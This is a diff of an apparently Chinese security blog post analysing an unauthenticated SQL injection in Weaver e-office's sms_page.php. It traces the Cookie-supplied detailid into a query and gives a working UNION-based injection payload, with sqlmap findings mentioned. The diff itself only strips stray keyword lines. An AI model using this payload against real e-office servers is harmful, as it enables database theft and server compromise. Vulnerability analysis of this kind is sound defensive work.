@@ -7,25 +7,23 @@ asset_dir: assets/泛微e-office-sms_page.php-sql注入漏洞
 # 泛微e-office sms\_page.php sql注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/3/10 08:32
-- 1255浏览
+- 1256浏览
 - [0评论](#comment)
 - 35分钟阅读
 
 深入探索
 
-软件
-
 鉴权
 
 身份验证
+
+软件
 
 ---
 
 # 漏洞简介
 
-[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office sms\_page.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
-
-编程
+[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office sms\_page.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
 
 # 影响版本
 
@@ -38,8 +36,6 @@ e-office <=9.5
 # 漏洞分析
 
 直接看 sms\_page.php 文件业务逻辑实现
-
-代码安全审计
 
 ```
 <?php
@@ -70,8 +66,6 @@ exequery( $connection, $sql );
 
 `$detailid` ==> `$smsid` ==> `getSmsInfo` getSmsInfo 函数业务逻辑如下
 
-漏洞扫描服务
-
 ```
 public function getSmsInfo( $limit = 0, $start = 0, $smsid = "", $keyWord = "" )
     {
@@ -95,8 +89,6 @@ public function getSmsInfo( $limit = 0, $start = 0, $smsid = "", $keyWord = "" )
 
 `$detailid` 通过 `$_REQUEST['detailid']` 获取，`$_REQUEST` 在 PHP 里属于一个包含了 `GET` 、`POST` 和 `COOKIE` 方法传递参数的超全局数组，因此在测试时可使用 `Cookie` 传递 `detailid` 值进入SQL语句中。
 
-物流软件安全
-
 # 漏洞复现
 
 ```
@@ -105,19 +97,9 @@ Host: eoffice.mrxn.net:8082
 Cookie: detailid=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b716b71,0x50696d475348684851524177764b6961774b5a696f44796e62664752514b78535244534662746978,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
 ```
 
-深入探索
-
-授权
-
-计算机安全
-
-技术文章订阅
-
 [![泛微e-office sms_page.php sql注入漏洞](images/img-001-b4293b058520.webp)](https://image.mrxn.net/f44c34052d9949fea0f979b04d4139b4.webp)
 
 通过联合注入 成功在响应回显了测试payload。
-
-网络安全
 
 通过 [sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 还可测试出其他注入方式如下
 
@@ -142,8 +124,6 @@ Parameter: detailid (GET)
 PS
 
 > 这是一个很老的漏洞，最近被人拿出来刷，我就考古看下 =\_= !
->
-> SQL注入检测工具
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
